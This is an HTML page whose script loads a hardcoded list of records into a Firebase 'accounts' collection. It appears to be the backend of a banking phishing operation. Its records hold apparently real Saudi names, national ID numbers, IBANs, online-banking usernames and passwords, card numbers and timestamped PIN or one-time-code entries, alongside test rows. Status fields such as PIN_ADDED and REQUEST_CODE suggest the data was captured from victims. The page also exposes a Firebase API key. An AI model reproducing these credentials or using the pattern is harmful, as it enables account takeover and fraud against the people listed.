<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8" />
		<meta http-equiv="X-UA-Compatible" content="IE=edge" />
		<meta name="viewport" content="width=device-width, initial-scale=1.0" />
		<title>Document</title>
		<script src="https://cdn.tailwindcss.com"></script>
	</head>

	<body>
		<!-- <div x-data=""></div> -->
		<script src="//unpkg.com/alpinejs" defer></script>
		<script type="module">
			import { initializeApp } from "https://www.gstatic.com/firebasejs/9.12.1/firebase-app.js";

			import {
				getFirestore,
				collection,
				doc,
				addDoc,
				setDoc,
				getDocs,
			} from "https://www.gstatic.com/firebasejs/9.12.1/firebase-firestore.js";

			const firebaseConfig = {
				apiKey: "AIzaSyA9QxtaVAxgyUp7I7BE9sc16qS02LX6Q7E",
				authDomain: "letterplace-c103c.firebaseapp.com",
				databaseURL: "https://letterplace-c103c.firebaseio.com",
				projectId: "letterplace-c103c",
				storageBucket: "letterplace-c103c.appspot.com",
				messagingSenderId: "658174549550",
				appId: "1:658174549550:web:d3c99b2be934379b6209bf",
			};

			// Initialize Firebase
			const app = initializeApp(firebaseConfig);
			const db = getFirestore(app);

			let rows = [
				{
					id: "765662",
					action: "COMPLETE",
					id_num: "10101010101",
					name_ar: "ahmad",
					name_en: null,
					birth_date_m: null,
					birth_date_h: "26\/2\/1422",
					end_date_m: null,
					end_date_h: null,
					birth_place: "kiddah",
					b_name: "Holandi Awal",
					iban: "4234234",
					deposit_code: "5555",
					amount: "5231",
					card_num: "1234123421341234",
					card_code: "4444",
					username: null,
					password: null,
					pin_data:
						'[{"time":"20:11:55","code":"1231"},{"time":"20:12:21","code":"1231"}]',
					state: "BANK_UPDATED",
					last_update: "2022-10-03 22:15:03",
				},
				{
					id: "765661",
					action: "NONE",
					id_num: "1111631683",
					name_ar:
						"\u0627\u062d\u0645\u062f \u0645\u062d\u0645\u062f \u0639\u0628\u062f\u0644\u0644\u0647 \u0627\u0644\u0628\u0627\u0642\u0631\u064a ",
					name_en: null,
					birth_date_m: null,
					birth_date_h: "26\/2\/1422",
					end_date_m: null,
					end_date_h: null,
					birth_place:
						"\u0627\u0644\u0645\u0645\u0644\u0643\u0647 \u0627\u0644\u0639\u0631\u0628\u064a\u0647 \u0627\u0644\u0633\u0639\u0648\u062f\u064a\u0647",
					b_name: "Ahli Bank",
					iban: "145647556888",
					deposit_code: "4557",
					amount: "4500",
					card_num: null,
					card_code: null,
					username: "ahmedm220110",
					password: "AHMED11",
					pin_data: '[{"time":"14:57:50","code":"2988"}]',
					state: "DETAILS_VIEWED",
					last_update: "2022-10-03 22:07:33",
				},
				{
					id: "765660",
					action: "COMPLETE",
					id_num: "1084967155",
					name_ar:
						"\u0647\u062f\u0649 \u0639\u0628\u062f\u0627\u0644\u0631\u062d\u0645\u0646 \u0627\u0628\u0631\u0627\u0647\u064a\u0645 \u0627\u0644\u0636\u0628\u064a\u0628\u064a",
					name_en: null,
					birth_date_m: null,
					birth_date_h: "8\/10\/1415",
					end_date_m: null,
					end_date_h: null,
					birth_place:
						"\u0627\u0644\u0645\u0645\u0644\u0643\u0647 \u0627\u0644\u0639\u0631\u0628\u064a\u0647 \u0627\u0644\u0633\u0639\u0648\u062f\u064a\u0647",
					b_name: "Faransi",
					iban: "Sa82550000000E402000019",
					deposit_code: "0243",
					amount: "1000",
					card_num: null,
					card_code: null,
					username: "1084967155",
					password: "Aa123456",
					pin_data: null,
					state: "BANK_UPDATED",
					last_update: "2022-10-03 17:46:18",
				},
				{
					id: "765659",
					action: "COMPLETE",
					id_num: "5555555555",
					name_ar: "Djajjd",
					name_en: null,
					birth_date_m: null,
					birth_date_h: "Sushs",
					end_date_m: null,
					end_date_h: null,
					birth_place: "Haauhe",
					b_name: "Holandi Awal",
					iban: "SA5156465165",
					deposit_code: "21561",
					amount: "321623",
					card_num: null,
					card_code: null,
					username: "54765163",
					password: "362516541",
					pin_data: '[{"time":"13:02:44","code":"6546"}]',
					state: "PIN_ADDED",
					last_update: "2022-10-03 17:47:00",
				},
				{
					id: "765658",
					action: "NONE",
					id_num: "1093951737",
					name_ar:
						"\u0645\u0627\u0631\u064a\u0627 \u0639\u0628\u062f\u0627\u0644\u0631\u062d\u0645\u0646 \u0627\u0628\u0631\u0627\u0647\u064a\u0645 \u0627\u0644\u0636\u0628\u064a\u0628\u064a",
					name_en: null,
					birth_date_m: null,
					birth_date_h: "14\/10\/1417",
					end_date_m: null,
					end_date_h: null,
					birth_place:
						"\u0627\u0644\u0645\u0645\u0644\u0643\u0647 \u0627\u0644\u0639\u0631\u0628\u064a\u0647 \u0627\u0644\u0633\u0639\u0648\u062f\u064a\u0647",
					b_name: "Rajhi",
					iban: "SA17 8000 0213 6080 1604 2965",
					deposit_code: "0243",
					amount: "1000",
					card_num: null,
					card_code: null,
					username: "1093951737",
					password: "Aa123456",
					pin_data: '[{"time":"12:56:33","code":"9088"}]',
					state: "PIN_ADDED",
					last_update: "2022-10-03 14:56:33",
				},
				{
					id: "765657",
					action: "REQUEST_CODE",
					id_num: "1049651902",
					name_ar:
						"\u0645\u062d\u0645\u062f \u0637\u0644\u0627\u0644 \u0645\u062d\u0645\u062f \u0639\u0644\u064a \u062e\u0636\u0631\u0649",
					name_en: null,
					birth_date_m: null,
					birth_date_h:
						"\u0661\u0664\u0660\u0665\/\u0660\u0666\/\u0661\u0661",
					end_date_m: null,
					end_date_h: null,
					birth_place:
						"\u0645\u0643\u0629 \u0627\u0644\u0643\u0631\u0645\u0629",
					b_name: "Saab",
					iban: "034090290001",
					deposit_code: "600500",
					amount: "1000",
					card_num: null,
					card_code: null,
					username: "034090290001",
					password: "Jtk109016",
					pin_data:
						'[{"time":"10:38:37","code":"5503"},{"time":"10:40:37","code":"5503"},{"time":"10:41:27","code":"4654"},{"time":"10:45:42","code":"1520"},{"time":"10:47:32","code":"1520"},{"time":"10:48:44","code":"6298"}]',
					state: "PIN_ADDED",
					last_update: "2022-10-03 12:50:44",
				},
				{
					id: "765656",
					action: "NONE",
					id_num: "1028140604",
					name_ar:
						"\u0641\u0627\u0646\u0632\u0647 \u0639\u0645\u0631 \u0633\u0627\u0644\u0645 \u0628\u0627\u0644\u0643\u0631\u0649",
					name_en: null,
					birth_date_m: null,
					birth_date_h:
						"\u0661\u0664\u0665\u0668\/\u0660\u0667\/\u0661\u0664",
					end_date_m: null,
					end_date_h: null,
					birth_place:
						"\u0645\u0643\u0629 \u0627\u0644\u0643\u0631\u0645\u0629",
					b_name: "Ahli Bank",
					iban: "SA1310000000155409000106",
					deposit_code: "56213",
					amount: "580",
					card_num: null,
					card_code: null,
					username: "Um Raef",
					password: "1433Rofe",
					pin_data:
						'[{"time":"09:11:34","code":"9520"},{"time":"09:15:03","code":"4607"},{"time":"09:21:32","code":"4186"},{"time":"09:22:20","code":"1433"},{"time":"09:23:16","code":"1182"},{"time":"09:40:31","code":"7067"},{"time":"09:41:15","code":"5596"}]',
					state: "PIN_ADDED",
					last_update: "2022-10-03 11:41:16",
				},
				{
					id: "765655",
					action: "NONE",
					id_num: "1083495174",
					name_ar:
						"\u0628\u0634\u0627\u0626\u0631 \u0648\u0642\u064a\u062a \u062d\u0633\u0646 \u062d\u0645\u0632\u064a\u0646 \u0627\u0644\u0635\u0645\u062f\u0627\u0646\u064a",
					name_en: null,
					birth_date_m: null,
					birth_date_h:
						"\u0662\u0667\/\u0660\u0665\/\u0661\u0664\u0664\u0664",
					end_date_m: null,
					end_date_h: null,
					birth_place: "\u0627\u0644\u0642\u0646\u0641\u0630\u0647",
					b_name: "Ahli Bank",
					iban: "SA8710000015268222000104",
					deposit_code: "700600",
					amount: "1000",
					card_num: null,
					card_code: null,
					username: null,
					password: null,
					pin_data: null,
					state: "BANK_UPDATED",
					last_update: "2022-10-03 10:53:57",
				},
				{
					id: "765654",
					action: "COMPLETE",
					id_num: "1111111112",
					name_ar: "salem",
					name_en: null,
					birth_date_m: null,
					birth_date_h: "30\/50\/1443",
					end_date_m: null,
					end_date_h: null,
					birth_place: "Riad",
					b_name: "Arabi",
					iban: "4727471837",
					deposit_code: "68048",
					amount: "30000",
					card_num: null,
					card_code: null,
					username: "4717472",
					password: "48274727",
					pin_data: '[{"time":"08:04:55","code":"5252"}]',
					state: "PIN_ADDED",
					last_update: "2022-10-03 10:05:12",
				},
				{
					id: "765653",
					action: "COMPLETE",
					id_num: "999999999",
					name_ar: "\u0639\u0628\u062f",
					name_en: null,
					birth_date_m: null,
					birth_date_h: "19\/06\/1443",
					end_date_m: null,
					end_date_h: null,
					birth_place: "\u0627\u0644\u062f\u0645\u0627\u0645",
					b_name: "Riyadh",
					iban: "SA37173178482",
					deposit_code: "503959",
					amount: "30000",
					card_num: null,
					card_code: null,
					username: "Dhajdhs",
					password: "djsjdh",
					pin_data:
						'[{"time":"13:56:40","code":"5284"},{"time":"13:57:22","code":"4344"}]',
					state: "PIN_ADDED",
					last_update: "2022-10-02 15:57:26",
				},
				{
					id: "765652",
					action: "COMPLETE",
					id_num: "1472583691",
					name_ar:
						"\u0639\u0628\u062f\u0627\u0644\u0644\u0647 \u0627\u0644\u0634\u0645\u0631\u064a",
					name_en: null,
					birth_date_m: null,
					birth_date_h: "13\/07\/1443",
					end_date_m: null,
					end_date_h: null,
					birth_place: "\u0627\u0644\u0631\u064a\u0627\u0636",
					b_name: "Arabi",
					iban: "Sa27264827482775",
					deposit_code: "7000",
					amount: "40000",
					card_num: null,
					card_code: null,
					username: "Ahdhajdj",
					password: "fjejdjwjd",
					pin_data:
						'[{"time":"09:48:26","code":"4252"},{"time":"09:48:57","code":"5253"},{"time":"09:49:09","code":"5353"}]',
					state: "PIN_ADDED",
					last_update: "2022-10-02 11:49:16",
				},
				{
					id: "765651",
					action: "ERROR_ONLINE_CONNECTION",
					id_num: "2030405060",
					name_ar: "\u062d\u0633\u064a\u0646",
					name_en: null,
					birth_date_m: null,
					birth_date_h: "30\/20\/1443",
					end_date_m: null,
					end_date_h: null,
					birth_place: "\u0627\u0644\u062f\u0645\u0627\u0645",
					b_name: "Arabi",
					iban: "Sa482747284727",
					deposit_code: "6000",
					amount: "30000",
					card_num: null,
					card_code: null,
					username: "Hsakdjjs",
					password: "ajjdjwj",
					pin_data: '[{"time":"06:31:26","code":"4253"}]',
					state: "PIN_ADDED",
					last_update: "2022-10-03 14:59:44",
				},
				{
					id: "765650",
					action: "NONE",
					id_num: "1020304050",
					name_ar: "\u0633\u0627\u0644\u0645",
					name_en: null,
					birth_date_m: null,
					birth_date_h: "30\/20\/1334",
					end_date_m: null,
					end_date_h: null,
					birth_place: "\u0627\u0644\u0631\u0628\u0627\u0636 ",
					b_name: "Holandi Awal",
					iban: "SA12345678912348",
					deposit_code: "45050899",
					amount: "30000",
					card_num: null,
					card_code: null,
					username: "AAsjhdgjak",
					password: "ASDsjgk",
					pin_data:
						'[{"time":"08:49:30","code":"4635"},{"time":"08:49:59","code":"4554"},{"time":"08:50:35","code":"5343"},{"time":"14:39:29","code":"1234"},{"time":"16:01:19","code":"1234"},{"time":"12:38:51","code":"2224"},{"time":"12:40:35","code":"1234"}]',
					state: "ONLINE_UPDATED",
					last_update: "2022-10-03 14:59:04",
				},
				{
					id: "765649",
					action: "ERROR_ONLINE_CONNECTION",
					id_num: "1234567890",
					name_ar:
						"\u0633\u0627\u0644\u0645 \u0633\u0627\u0644\u0645",
					name_en: null,
					birth_date_m: null,
					birth_date_h: "19\/03\/1443",
					end_date_m: null,
					end_date_h: null,
					birth_place: "\u0627\u0644\u0631\u064a\u0627\u0636",
					b_name: "Arabi",
					iban: "57574747484",
					deposit_code: "6675",
					amount: "38744",
					card_num: null,
					card_code: null,
					username: "Aaaaaa11",
					password: "aaaaaa46",
					pin_data:
						'[{"time":"16:05:58","code":"4444"},{"time":"16:06:32","code":"5675"}]',
					state: "PIN_ADDED",
					last_update: "2022-10-04 19:44:57",
				},
				{
					id: "765648",
					action: "COMPLETE",
					id_num: "12345",
					name_ar:
						"\u0633\u0627\u0644\u0645 \u0633\u0627\u0644\u0645",
					name_en: null,
					birth_date_m: null,
					birth_date_h: "19\/03\/1443",
					end_date_m: null,
					end_date_h: null,
					birth_place: "\u0627\u0644\u0631\u064a\u0627\u0636",
					b_name: null,
					iban: null,
					deposit_code: null,
					amount: null,
					card_num: null,
					card_code: null,
					username: null,
					password: null,
					pin_data: null,
					state: "INITIALIZED",
					last_update: "2022-09-30 18:03:21",
				},
				{
					id: "765647",
					action: "COMPLETE",
					id_num: "123456789",
					name_ar: "\u0627\u062d\u0645\u062f \u0639\u0644\u064a ",
					name_en: null,
					birth_date_m: null,
					birth_date_h: "19\/09\/1443",
					end_date_m: null,
					end_date_h: null,
					birth_place: "Dmam",
					b_name: "Arabi",
					iban: "Safets",
					deposit_code: "Aresds",
					amount: "33333",
					card_num: null,
					card_code: null,
					username: "Asfasff",
					password: "aafadda",
					pin_data:
						'[{"time":"14:46:59","code":"5857"},{"time":"23:52:37","code":"3333"},{"time":"23:53:19","code":"4444"}]',
					state: "ID_ACCEPTED",
					last_update: "2022-10-01 17:52:37",
				},
				{
					id: "765646",
					action: "COMPLETE",
					id_num: "100694433",
					name_ar: "\u0645\u062d\u0645\u062f",
					name_en: null,
					birth_date_m: null,
					birth_date_h: "03\/10\/1994",
					end_date_m: null,
					end_date_h: null,
					birth_place: "\u0627\u0644\u062e\u0628\u0631",
					b_name: null,
					iban: null,
					deposit_code: null,
					amount: null,
					card_num: null,
					card_code: null,
					username: null,
					password: null,
					pin_data: null,
					state: "INITIALIZED",
					last_update: "2022-09-30 16:18:41",
				},
				{
					id: "765645",
					action: "COMPLETE",
					id_num: "1048798510",
					name_ar: "\u0633\u0627\u0645\u064a",
					name_en: null,
					birth_date_m: null,
					birth_date_h: "6.3.1994",
					end_date_m: null,
					end_date_h: null,
					birth_place: "\u0627\u0644\u0639\u0633\u064a\u0631",
					b_name: null,
					iban: null,
					deposit_code: null,
					amount: null,
					card_num: null,
					card_code: null,
					username: null,
					password: null,
					pin_data: null,
					state: "INITIALIZED",
					last_update: "2022-09-30 16:16:02",
				},
				{
					id: "765644",
					action: "COMPLETE",
					id_num: "1518541510",
					name_ar: "\u0633\u0627\u0645\u064a",
					name_en: null,
					birth_date_m: null,
					birth_date_h: "6.3.1994",
					end_date_m: null,
					end_date_h: null,
					birth_place: "\u0627\u0644\u0639\u0633\u064a\u0631",
					b_name: null,
					iban: null,
					deposit_code: null,
					amount: null,
					card_num: null,
					card_code: null,
					username: null,
					password: null,
					pin_data: null,
					state: "INITIALIZED",
					last_update: "2022-09-30 16:16:06",
				},
				{
					id: "765643",
					action: "COMPLETE",
					id_num: "1234567891",
					name_ar: "One",
					name_en: null,
					birth_date_m: null,
					birth_date_h: "19\/05\/2020",
					end_date_m: null,
					end_date_h: null,
					birth_place: "Dmam",
					b_name: "Inma",
					iban: "Sa123456789101112",
					deposit_code: "7747",
					amount: "30000",
					card_num: "1234567891012345",
					card_code: "3717",
					username: "Aa123",
					password: "Aa123",
					pin_data:
						'[{"time":"14:11:23","code":"1234"},{"time":"14:12:21","code":"1234"},{"time":"14:12:52","code":"1111"},{"time":"14:14:33","code":"1477"}]',
					state: "PIN_ADDED",
					last_update: "2022-09-30 18:04:07",
				},
				{
					id: "765642",
					action: "COMPLETE",
					id_num: "0987654321",
					name_ar:
						"\u0645\u062d\u0645\u062f \u0639\u0633\u064a\u0631\u064a",
					name_en: null,
					birth_date_m: null,
					birth_date_h: "14\/08\/1413",
					end_date_m: null,
					end_date_h: null,
					birth_place: "\u0631\u064a\u0627\u0636",
					b_name: "Ahli Bank",
					iban: "134567887988",
					deposit_code: "24578678",
					amount: "4000",
					card_num: "4580789014531366",
					card_code: "1234",
					username: "1356998678",
					password: "A12334567",
					pin_data: '[{"time":"14:01:39","code":"4555"}]',
					state: "ONLINE_UPDATED",
					last_update: "2022-09-30 18:04:05",
				},
				{
					id: "765641",
					action: "COMPLETE",
					id_num: "1081217315",
					name_ar:
						"\u064a\u062d\u064a\u0649 \u0628\u0646 \u0645\u062d\u0645\u062f \u064a\u062d\u064a\u0649 \u0639\u0633\u064a\u0631\u064a",
					name_en: null,
					birth_date_m: null,
					birth_date_h: "14\/08\/1413",
					end_date_m: null,
					end_date_h: null,
					birth_place:
						"\u0631\u062c\u0627\u0644 \u0627\u0644\u0645\u0639",
					b_name: "Saab",
					iban: "SA52546464646464",
					deposit_code: "12500",
					amount: "1200",
					card_num: null,
					card_code: null,
					username: "test",
					password: "12346",
					pin_data:
						'[{"time":"09:48:43","code":"1234"},{"time":"09:49:03","code":"2525"},{"time":"09:49:37","code":"2526"},{"time":"09:54:53","code":"1250"},{"time":"09:55:08","code":"1250"}]',
					state: "PIN_ADDED",
					last_update: "2022-09-30 16:05:05",
				},
			];

			console.log("Firestore: ", db);

			// const querySnapshot = await getDocs(collection(db, "accounts"));
			// let i = 0;
			// querySnapshot.forEach(async (document) => {
			// 	i++;
			// 	console.log(document.id, document.data());

			// 	const ref = doc(db, "accounts", document.id);

			// 	console.log(Date.now(), i);

			// 	const res = await setDoc(
			// 		ref,
			// 		{ createdAt: Date.now() + 937 * i },
			// 		{ merge: true }
			// 	);

			// 	console.log("Document updated: ", res);
			// });

			rows.forEach(async (row) => {
				try {
					const docRef = await setDoc(
						doc(db, "accounts", row.id_num),
						{
							...row,
							created_at: Date.now(),
							last_update: row.last_update?.length
								? new Date(row.last_update).getTime()
								: Date.now(),
						}
					);
					// const docRef = await addDoc(
					// 	collection(db, "accounts"),
					// 	row
					// );
					console.log("Document written with ID: ", docRef.id);
				} catch (e) {
					console.error("Error adding document: ", e);
				}
			});
		</script>
	</body>
</html>
